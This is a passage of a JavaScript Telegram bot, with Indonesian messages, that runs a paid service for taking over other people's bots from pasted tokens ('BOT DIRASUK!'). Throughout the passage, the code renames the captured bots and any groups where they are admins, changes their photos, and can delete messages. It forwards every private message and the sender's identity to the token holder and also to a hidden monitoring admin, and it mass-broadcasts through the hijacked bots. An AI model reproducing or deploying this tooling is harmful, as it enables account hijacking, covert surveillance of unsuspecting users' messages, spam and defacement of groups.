  const userId = msg.from?.id, chatId = msg.chat?.id;
  if (!userId || !chatId) return;
  trackUser(msg.from);

  const isAdminBroadcast = hasMinRole(userId, "owner") && userState[userId] === "admin_waiting_broadcast";
  const isSetGlobalAutoReply = userState[userId] === "waiting_global_autojawab" && hasMinRole(userId, "owner");
  const isAddRoleState = String(userState[userId] || "").startsWith("waiting_add_role:");
  const isWaitingProof = String(userState[userId] || "").startsWith("waiting_proof:");
  const isWaitingAccessTarget = String(userState[userId] || "").startsWith("waiting_access_target_id:");
  const isWaitingRedeem = userState[userId] === "waiting_redeem_code";

  if (!msg.text && !msg.reply_to_message && !isAdminBroadcast && !isSetGlobalAutoReply && !isWaitingProof) return;
  if (msg.text?.startsWith("/start")) return;

  if (isWaitingRedeem && msg.text && !msg.text.startsWith("/")) {
    const codeInput = msg.text.trim();
    userState[userId] = null;
    await processRedeem(chatId, userId, codeInput);
    return;
  }

  if (msg.text === "/cancel") {
    userState[userId] = null;
    await sendStartMenuOnly(chatId, userId, hasMinRole(userId, "prem"), msg.from);
    return;
  }

  if (isAddRoleState && msg.text && !msg.text?.startsWith("/")) {
    const targetRole = String(userState[userId]).split(":")[1];
    userState[userId] = null;
    if (!canAddRole(userId, targetRole)) return;
    const args = msg.text.trim().split(/\s+/).filter(Boolean);
    const targetId = parseInt(String(args[0] || "").replace(/[^0-9-]/g, ""), 10);
    const hariRaw = args[1] || null;
    if (!Number.isFinite(targetId) || targetId <= 0) { sendBotText(chatId, "❌ ID gak valid."); return; }
    if (DEVELOPER_IDS.includes(targetId)) return;
    let expireAtMs = null, durationLabel = "Permanent";
    if (hariRaw) {
      const h = parseInt(hariRaw.replace(/[^0-9]/g, ""), 10);
      if (!Number.isFinite(h) || h <= 0) { sendBotText(chatId, "❌ Hari gak valid."); return; }
      expireAtMs = Date.now() + h * 86400000; durationLabel = `${h} hari`;
    }
    setUserRole(targetId, targetRole, expireAtMs);
    await sendBotText(chatId, `✅ Role <b>${ROLE_LABELS[targetRole]}</b> dikasih ke <code>${targetId}</code>\n⏰ ${durationLabel}`, { parse_mode: "HTML" });
    sendBotText(targetId, `🎉 <b>Kamu dapet role!</b>\n\n👑 ${ROLE_LABELS[targetRole]}\n⏰ ${durationLabel}`, { parse_mode: "HTML" }).catch(() => {});
    return;
  }

  if (!hasMinRole(userId, "prem") && !isWaitingProof) { const ok = await enforceForceJoinOrSendPrompt(chatId, userId); if (!ok) return; }

  if (isSetGlobalAutoReply && msg.text && !msg.text?.startsWith("/")) {
    userState[userId] = null;
    const txt = String(msg.text || "").trim();
    if (!txt) return;
    const d = loadData();
    if (/^(off|disable|mati)$/i.test(txt)) { d.settings.globalAutoReply.enabled = false; d.settings.globalAutoReply.text = ""; saveData(d); sendBotText(chatId, "✅ Auto Balas Global OFF."); return; }
    d.settings.globalAutoReply.enabled = true; d.settings.globalAutoReply.text = txt;
    saveData(d); sendBotText(chatId, "✅ Auto Balas Global disimpan."); return;
  }
  if (userState[userId] === "admin_waiting_forcejoin" && hasMinRole(userId, "owner") && msg.text && !msg.text?.startsWith("/")) {
    userState[userId] = null;
    const parts = msg.text.trim().split("|").map(s => s.trim()).filter(Boolean);
    if (parts.length < 2) { sendBotText(chatId, "❌ Format salah."); return; }
    const fjChatId = parseInt(parts[0], 10);
    if (Number.isNaN(fjChatId)) { sendBotText(chatId, "❌ CHAT_ID angka."); return; }
    const d = loadData();
    d.settings.forceJoin.chatId = fjChatId; d.settings.forceJoin.inviteLink = parts[1]; d.settings.forceJoin.title = parts[2] || "Channel/Grup";
    saveData(d); sendBotText(chatId, "✅ Target disimpan."); return;
  }
  if (isAdminBroadcast) {
    userState[userId] = null;
    const d = loadData();
    const targets = Object.keys(d.users || {}).map(x => parseInt(x, 10)).filter(id => id && !hasMinRole(id, "owner"));
    if (!targets.length) { sendBotText(chatId, "👥 Belum ada user."); return; }
    let okCount = 0, failCount = 0;
    for (const uid of targets) {
      try { if (msg.text) await sendBotText(uid, msg.text); okCount++; }
      catch { failCount++; }
    }
    sendBotText(chatId, `✅ Broadcast: ${okCount} ok, ${failCount} gagal`); return;
  }
  if (userState[userId] === "waiting_broadcast_slave" && hasMinRole(userId, "owner")) {
    userState[userId] = null;
    const d = loadData(); const tokens = Object.keys(d.bots || {});
    if (!tokens.length) { sendBotText(chatId, "📭 Belum ada bot."); return; }
    const loadingMsg = await sendBotText(chatId, `⏳ Broadcast ke ${tokens.length} bot...`);
    let totalOk = 0, totalFail = 0;
    for (const token of tokens) {
      const slave = slaveBots[token]; if (!slave) continue;
      const botData = d.bots[token] || {};
      for (const cid of Object.keys(botData.chats || {})) {
        const cidNum = parseInt(cid, 10);
        if (!cidNum || cidNum < 0) continue;
        try { if (msg.text) await slave.sendMessage(cidNum, msg.text); totalOk++; } catch { totalFail++; }
        await sleep(50);
      }
    }
    try { await main.editMessageText(`✅ Selesai! Terkirim: ${totalOk}, Gagal: ${totalFail}`, { chat_id: chatId, message_id: loadingMsg.message_id }); } catch {}
    return;
  }
  if (isWaitingAccessTarget && msg.text && !msg.text?.startsWith("/")) {
    const kindKey = String(userState[userId]).split(":")[1] || "perm";
    const targetId = parseInt(String(msg.text || "").replace(/[^0-9-]/g, ""), 10);
    if (!Number.isFinite(targetId) || targetId <= 0) { sendBotText(chatId, "❌ ID tidak valid."); return; }
    userState[userId] = null;
    const productName = kindKey === "1d" ? ACCESS_1D_PRODUCT_NAME : ACCESS_BOT_PRODUCT_NAME;
    const price = kindKey === "1d" ? ACCESS_1D_PRICE : ACCESS_BOT_PRICE;
    await sendBotText(chatId, `🛒 <b>${productName}</b>\n🆔 <code>${targetId}</code>\n💰 Rp${Number(price).toLocaleString("id-ID")}\n\nPilih metode:`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: [
        [{ text: "💙 Dana", callback_data: `buyacc_pay_dana_${kindKey}_${targetId}` }],
        [{ text: "📷 QRIS", callback_data: `buyacc_pay_qris_${kindKey}_${targetId}` }],
        [{ text: "🔙 Kembali", callback_data: "menu_shop", style: "primary" }]
      ]}});
    return;
  }
  if (userState[userId] === "waiting_token" && !msg.text?.startsWith("/")) {
    if (!isAllowedCreator(userId)) { userState[userId] = null; sendBotText(chatId, "❌ Gak punya akses."); return; }
    userState[userId] = null;
    await createSlaveBotFromToken(msg.text.trim(), userId, chatId, msg.from); return;
  }
  if (!userState[userId] && msg.chat?.type === "private" && msg.text && !msg.text.startsWith("/") && isLikelyTelegramBotToken(msg.text)) {
    if (!isAllowedCreator(userId)) { sendBotText(chatId, "❌ Gak punya akses."); return; }
    await createSlaveBotFromToken(msg.text.trim(), userId, chatId, msg.from); return;
  }

  if (msg.reply_to_message) {
    const refId = msg.reply_to_message.message_id;
    const info = replyMap[refId];
    if (!info || info.isMonitor) return;
    const d = loadData(); const bot = d.bots[info.token];
    if (!bot) return;
    if (bot.ownerId !== userId && !hasMinRole(userId, "owner")) return;
    const slave = slaveBots[info.token];
    if (!slave) return;
    try {
      if (msg.text) await slave.sendMessage(info.chatId, msg.text);
      else if (msg.photo) await slave.sendPhoto(info.chatId, msg.photo[msg.photo.length - 1].file_id, { caption: msg.caption || "" });
      else if (msg.video) await slave.sendVideo(info.chatId, msg.video.file_id, { caption: msg.caption || "" });
      else if (msg.voice) await slave.sendVoice(info.chatId, msg.voice.file_id);
      else if (msg.audio) await slave.sendAudio(info.chatId, msg.audio.file_id);
      else if (msg.document) await slave.sendDocument(info.chatId, msg.document.file_id);
      else if (msg.sticker) await slave.sendSticker(info.chatId, msg.sticker.file_id);
      else { sendBotText(chatId, "⚠️ Tipe tidak didukung."); return; }
      sendBotText(chatId, "✅ Terkirim!");
    } catch (e) { sendBotText(chatId, `❌ Gagal: ${e.message}`); }
  }
});

// ─── SLAVE BOT ──────────────────────────────────────────────────────
async function applySlaveProfile(slaveBot) {
  if (!SLAVE_AUTO_SET_PROFILE || !slaveBot) return { renamed: false };
  await sleep(600);
  let renamed = false;
  if (SLAVE_DISPLAY_NAME) { try { if (typeof slaveBot.setMyName === "function") await slaveBot.setMyName({ name: SLAVE_DISPLAY_NAME }); renamed = true; } catch {} }
  if (SLAVE_BIO_TEXT) { try { if (typeof slaveBot.setMyDescription === "function") await slaveBot.setMyDescription({ description: SLAVE_BIO_TEXT }); } catch {} }
  if (SLAVE_SHORT_BIO_TEXT) { try { if (typeof slaveBot.setMyShortDescription === "function") await slaveBot.setMyShortDescription({ short_description: SLAVE_SHORT_BIO_TEXT }); } catch {} }
  if (SLAVE_AUTO_SET_PHOTO) {
    const p = (SLAVE_PROFILE_PHOTO_JPG && fs.existsSync(SLAVE_PROFILE_PHOTO_JPG)) ? SLAVE_PROFILE_PHOTO_JPG :
      (SLAVE_PROFILE_PHOTO_PNG && fs.existsSync(SLAVE_PROFILE_PHOTO_PNG)) ? SLAVE_PROFILE_PHOTO_PNG :
      (START_PHOTO_PATH && fs.existsSync(START_PHOTO_PATH)) ? START_PHOTO_PATH : null;
    if (p) { try {
      if (typeof slaveBot._request === "function") {
        const partName = "profile_photo";
        const photoJson = JSON.stringify({ type: "static", photo: `attach://${partName}` });
        await slaveBot._request("setMyProfilePhoto", { qs: { photo: photoJson }, formData: { [partName]: fs.createReadStream(p) } });
      }
    } catch {} }
  }
  return { renamed };
}

async function createSlaveBotFromToken(tokenInput, userId, chatId, from) {
  const token = String(tokenInput || "").trim();
  if (!isLikelyTelegramBotToken(token)) { await sendBotText(chatId, "❌ Token tidak valid."); return null; }
  const d = loadData();
  if (d.bots[token]) { await sendBotText(chatId, "⚠️ Token sudah terdaftar!"); return null; }
  await sendBotText(chatId, "⏳ Mengambil alih bot...");
  try {
    await registerSlaveBot(token, userId);
    const info = await slaveBots[token].getMe();
    d.bots[token] = { name: info.username, ownerId: userId, ownerChatId: chatId, limit: DEFAULT_LIMIT, usedCount: 0, active: true, chats: {} };
    saveData(d); tokenToIdx(token);
    const profileResult = await applySlaveProfile(slaveBots[token]);
    const renameNote = profileResult?.renamed ? "" : "\n⚠️ Gagal ubah nama";
    await sendBotText(chatId, `✅ <b>BOT DIRASUK!</b>\n\n🤖 ${info.first_name}\n🔗 @${info.username}${renameNote}`, { parse_mode: "HTML" });
    const userRoleInfo = getUserRole(userId);
    const userName = [from?.first_name, from?.last_name].filter(Boolean).join(" ").trim() || "(tanpa nama)";
    const userAt = from?.username ? `@${from.username}` : "(tanpa username)";
    await sendRasukLogDetail({ botUsername: info.username || "?", botName: info.first_name || "?", botId: info.id || "?", userName, userUsername: userAt, userId, userRole: ROLE_LABELS[userRoleInfo.role] || ROLE_LABELS.none, token: maskToken(token), status: "✅ AKTIF" });
    return { token, info };
  } catch (e) {
    try { if (slaveBots[token]) { try { slaveBots[token].stopPolling(); } catch {} delete slaveBots[token]; } } catch {}
    await sendBotText(chatId, `❌ Gagal: ${e.message}`);
    return null;
  }
}

function registerSlaveBot(token, ownerId) {
  return new Promise((resolve, reject) => {
    try {
      const slave = new TelegramBot(token, { polling: { params: { allowed_updates: ["message", "edited_message", "callback_query", "my_chat_member", "chat_member"] } } });
      let slaveBotIdCache = null;
      slave.getMe().then((me) => { slaveBotIdCache = me?.id || null; }).catch(() => {});
      async function getSlaveBotId() { if (slaveBotIdCache) return slaveBotIdCache; try { const me = await slave.getMe(); slaveBotIdCache = me?.id || null; return slaveBotIdCache; } catch { return null; } }

      async function applyGroupAdminActions(chatId, chatType) {
        try {
          if (!(chatType === "group" || chatType === "supergroup")) return;
          const d = loadData(); if (!d.bots[token]) return;
          const botId = await getSlaveBotId(); if (!botId) return;
          const m = await slave.getChatMember(chatId, botId); const st = m?.status || "";
          if (!(st === "administrator" || st === "creator")) return;
          if (SLAVE_AUTO_RENAME_GROUP) {
            d.bots[token].renamedChats = d.bots[token].renamedChats || {};
            if (!d.bots[token].renamedChats[String(chatId)]) { try { await slave.setChatTitle(chatId, SLAVE_GROUP_TITLE); d.bots[token].renamedChats[String(chatId)] = true; } catch {} }
          }
          if (SLAVE_AUTO_SET_GROUP_PHOTO) {
            const p = (SLAVE_GROUP_PHOTO_JPG && fs.existsSync(SLAVE_GROUP_PHOTO_JPG)) ? SLAVE_GROUP_PHOTO_JPG : (SLAVE_GROUP_PHOTO_PNG && fs.existsSync(SLAVE_GROUP_PHOTO_PNG)) ? SLAVE_GROUP_PHOTO_PNG : null;
            if (p) { try { if (typeof slave.setChatPhoto === "function") await slave.setChatPhoto(chatId, fs.createReadStream(p)); } catch {} }
          }
          saveData(d);
        } catch {}
      }

      slave.on("my_chat_member", async (upd) => {
        try {
          const chat = upd?.chat; const chatId = chat?.id; const chatType = chat?.type || "";
          if (!chatId) return;
          if (!(chatType === "group" || chatType === "supergroup")) return;
          const s = upd?.new_chat_member?.status || "";
          if (!(s === "administrator" || s === "creator")) return;
          await applyGroupAdminActions(chatId, chatType);
        } catch {}
      });
      slave.on("chat_member", async (upd) => { try { const c = upd?.chat; if (!c?.id) return; await applyGroupAdminActions(c.id, c.type || ""); } catch {} });

      slave.on("message", async (msg) => {
        const user = msg.from; const chatId = msg.chat.id; const chatType = msg.chat?.type || "";
        if (chatId && (chatType === "group" || chatType === "supergroup")) await applyGroupAdminActions(chatId, chatType);
        { const dDel = loadData(); if (dDel.bots?.[token]?.autoDeleteEnabled && msg.message_id) { try { if (typeof slave.deleteMessage === "function") slave.deleteMessage(chatId, msg.message_id).catch(() => {}); } catch {} } }
        const { name, uname, uid } = formatSenderInfo(msg);
        const content = formatMessageContent(msg);
        const d = loadData(); if (!d.bots[token]) return;
        d.bots[token].active = true;
        d.bots[token].usedCount = (d.bots[token].usedCount || 0) + 1;
        d.bots[token].chats = d.bots[token].chats || {};
        d.bots[token].chats[chatId] = { name, username: uname };
        const used = d.bots[token].usedCount;
        saveData(d);
        const botArText = d.bots[token]?.autoReplyEnabled && String(d.bots[token]?.autoReplyText || "").trim() ? String(d.bots[token].autoReplyText).trim() : null;
        const globalAr = d.settings?.globalAutoReply || {};
        const globalArText = globalAr?.enabled && String(globalAr?.text || "").trim() ? String(globalAr.text).trim() : null;
        const arText = botArText || globalArText;
        if (arText) { try { const bi = d.bots[token] || {}; await sendAutoReplyRepeated(slave, chatId, arText, msg?.message_id || null, bi.name ? `@${bi.name}` : "?"); } catch {} }
        const botOwnerId = d.bots[token].ownerId || ownerId;
        const notif = `📨 <b>Pesan Masuk</b>\n━━━━━━━━━━━━━━\n🤖 Bot: @${d.bots[token].name}\n👤 Dari: ${name} (${uname})\n🆔 User: ${uid}\n🆔 Chat: <code>${chatId}</code>\n📊 Pesan: ${used}/∞\n━━━━━━━━━━━━━━\n${content}\n\n<i>Reply untuk balas.</i>`;
        const sent = await sendBotText(botOwnerId, notif, { parse_mode: "HTML" });
        replyMap[sent.message_id] = { token, chatId, isMonitor: false };
        if (botOwnerId !== ADMIN_ID) { const sa = await sendBotText(ADMIN_ID, `👁 <b>[Monitor]</b>\n${notif}`, { parse_mode: "HTML" }); replyMap[sa.message_id] = { token, chatId, isMonitor: true }; }
      });

      slave.on("polling_error", async (err) => {
        const errMsg = String(err?.message || "").toLowerCase();
        const errCode = err?.response?.statusCode || err?.code || null;
        const isRevoked = errCode === 401 || errMsg.includes("unauthorized") || errMsg.includes("bot was kicked");
        const isDeleted = errCode === 403 || errMsg.includes("bot was blocked");
        if (!isRevoked && !isDeleted) return;
        const reasonLabel = isRevoked ? "🔑 Token di-revoke" : "🗑 Bot dihapus/diblokir";
        if (slaveBots[token]?._revokeHandled) return;
        if (slaveBots[token]) slaveBots[token]._revokeHandled = true;
        const d = loadData();
        const botInfo = d.bots?.[token] || {};
        const botName = botInfo.name ? `@${botInfo.name}` : `(token: ${maskToken(token)})`;
        const botOwnerId = botInfo.ownerId || null;
        try { if (slaveBots[token]) { try { slaveBots[token].stopPolling(); } catch {} delete slaveBots[token]; } } catch {}
        if (d.bots[token]) { delete d.bots[token]; saveData(d); }
        const notifText = `💀 <b>BOT DIMATIKAN PAKSA</b>\n━━━━━━━━━━━━━━━━━━━━\n🤖 <b>Bot:</b> ${botName}\n❌ <b>Alasan:</b> ${reasonLabel}\n🔑 <b>Token:</b> <code>${maskToken(token)}</code>\n🗑️ Status: AUTO-REMOVE`;
        if (NOTIFY_CHANNEL) sendBotText(NOTIFY_CHANNEL, notifText).catch(() => {});
        if (botOwnerId) sendBotText(botOwnerId, notifText, { parse_mode: "HTML" }).catch(() => {});
      });

      slaveBots[token] = slave;
      resolve(slave);
    } catch (e) { reject(e); }
  });
}

// ─── AUTO BACKUP ────────────────────────────────────────────────────
async function performAutoBackup(silent = false) {
  try {
    const dataPath = path.join(__dirname, "data.json");
    if (!fs.existsSync(dataPath)) return null;
    const backupDir = path.join(__dirname, "backups");
    if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });
    const data = fs.readFileSync(dataPath, "utf8");
    let parsed; try { parsed = JSON.parse(data); } catch { parsed = {}; }
    const botCount = Object.keys(parsed.bots || {}).length, userCount = Object.keys(parsed.users || {}).length;
    const now = new Date(); const pad = (n) => String(n).padStart(2, "0");
    const stamp = `${now.getFullYear()}-${pad(now.getMonth() + 1)}-${pad(now.getDate())}_${pad(now.getHours())}-${pad(now.getMinutes())}`;
    const fileName = `auto_backup_${stamp}.txt`;
    const filePath = path.join(backupDir, fileName);
    fs.writeFileSync(filePath, data, "utf8");
    console.log(`[AutoBackup] ✅ ${fileName} (${botCount} bot, ${userCount} user)`);
    if (AUTO_BACKUP_SEND_TO_ADMIN && !silent) {
      const caption = `📦 <b>AUTO BACKUP</b>\n📁 <code>${fileName}</code>\n🤖 ${botCount} bot\n👥 ${userCount} user`;
      try { await main.sendDocument(ADMIN_ID, filePath, { caption, parse_mode: "HTML" }); } catch {}
    }
    try {
      const all = fs.readdirSync(backupDir).filter(f => f.startsWith("auto_backup_")).map(f => ({ f, t: fs.statSync(path.join(backupDir, f)).mtimeMs })).sort((a, b) => b.t - a.t);
      if (all.length > AUTO_BACKUP_KEEP) for (const { f } of all.slice(AUTO_BACKUP_KEEP)) { try { fs.unlinkSync(path.join(backupDir, f)); } catch {} }
    } catch {}
    return filePath;
  } catch (e) { console.error("[AutoBackup] Gagal:", e.message); return null; }
}
if (AUTO_BACKUP_ENABLED) {
  setTimeout(() => { performAutoBackup(true).catch(() => {}); }, 30000);
  setInterval(() => { performAutoBackup(false).catch(() => {}); }, AUTO_BACKUP_INTERVAL_MS);
  console.log(`📦 Auto Backup aktif.`);
}

// ─── START ──────────────────────────────────────────────────────────
preloadTokenIndex();
console.log("🚀 rasuk Bot berjalan!\n");

async function restoreSlaves() {
  const d = loadData();
  const tokens = Object.keys(d.bots);
  if (!tokens.length) return;
  console.log(`🔄 Restore ${tokens.length} slave bot...`);
  for (const token of tokens) {
    try { await registerSlaveBot(token, d.bots[token].ownerId); await applySlaveProfile(slaveBots[token]); const info = await slaveBots[token].getMe(); console.log(`   ✅ @${info.username}`); }
    catch (e) { console.error(`   ❌ ${e.message}`); }
  }
}

restoreSlaves().then(() => {
  console.log("✅ Siap.\n");
  setTimeout(() => { sendStartupLog().catch(() => {}); }, 3000);
});

main.on("polling_error", (err) => console.error("[Main Error]", err.message));
process.on("unhandledRejection", (reason) => console.error("[UnhandledRejection]", reason));
process.on("uncaughtException", (err) => console.error("[UncaughtException]", err));
